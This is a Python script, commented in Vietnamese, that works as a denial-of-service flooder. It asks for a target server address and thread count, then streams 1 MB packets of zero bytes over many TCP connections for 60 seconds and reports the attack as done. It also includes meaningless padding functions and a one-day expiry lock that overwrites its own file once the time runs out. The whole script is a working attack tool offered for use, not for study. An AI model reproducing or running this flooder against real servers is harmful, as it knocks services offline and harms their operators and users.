import socket
import threading
import time
import os
from datetime import datetime, timedelta

# 🔒 File khóa đặt trong thư mục user (~/.moncute_lock)
LOCK_FILE = os.path.expanduser("~/.moncute_lock")

# Hàm vô nghĩa 1
def _Xx1yZ_():
    a = 0
    for _ in range(1000):
        a += 1
    return a

# Hàm vô nghĩa 2
def __ZZ12__(_param):
    return _param * 42 - 17 + _Xx1yZ_()

def is_expired():
    """dang kiem tra ip"""
    if not os.path.exists(LOCK_FILE):
        with open(LOCK_FILE, "w") as f:
            f.write(datetime.now().isoformat())
        return False
    else:
        with open(LOCK_FILE, "r") as f:
            timestamp = f.read().strip()
        try:
            start_time = datetime.fromisoformat(timestamp)
            if datetime.now() > start_time + timedelta(days=1):
                return True
        except Exception:
            return True
        return False

def ___random_func__():
    x = 0
    for i in range(500):
        x += i * i % 7
    return x % 13

def disable_script():
    """ddos serrver"""
    script_path = os.path.abspath(__file__)
    try:
        with open(script_path, "w") as f:
            f.write(
                "print('vui long cho doi')\n"
                "print('dang chinh sua')\n"
            )
        print("dang kick hoat")
    except Exception as e:
        print(f"Lỗi khi vô hiệu hoá script: {e}")

def main():
    print("📝 Thời gian sử dụng: 1 ngày kể từ khi upload file !!!")

    if is_expired():
        print(".")
        print("Vui lòng liên hệ ad")
        disable_script()
        return

    try:
        # Nhập IP server theo định dạng ip:port
        server_address = input("Nhập IP server (vd: gold6.asaka.asia:25080): ")
        if ":" not in server_address:
            raise ValueError("Sai định dạng ip:port")
        server_ip, server_port = server_address.split(":")
        server_port = int(server_port)

        # Tạo gói tin 1MB toàn byte 0
        packet = b"\x00" * (1 * 1024 * 1024)
        packet_count = 100000

        thread_count = int(input("Nhập số luồng: "))

        stop_event = threading.Event()
        timer_thread = threading.Thread(target=stop_after_timeout, args=(stop_event,))
        timer_thread.start()

        threads = []
        for i in range(thread_count):
            t = threading.Thread(target=send_packet, args=(server_ip, server_port, packet, packet_count, i + 1, stop_event))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print("✅ đã tấn công !!!")

    except Exception as e:
        print(f"Lỗi: {e}")

def stop_after_timeout(stop_event, timeout=60):
    # Đợi đủ thời gian rồi set flag dừng
    time.sleep(timeout)
    stop_event.set()
    print("\n✅ Dừng gửi sau 60 giây.")

def send_packet(server_ip, server_port, packet, packet_count, thread_id, stop_event):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((server_ip, server_port))
            # Bắt đầu gửi dữ liệu
            for i in range(packet_count):
                if stop_event.is_set():
                    break
                s.sendall(packet)
                print(f"[Luồng {thread_id}] badat2206 đã thảm gia O_o ({i + 1}/{packet_count})")
    except Exception as e:
        print(f"[Luồng {thread_id}] Lỗi: {e}")

if __name__ == "__main__":
    main()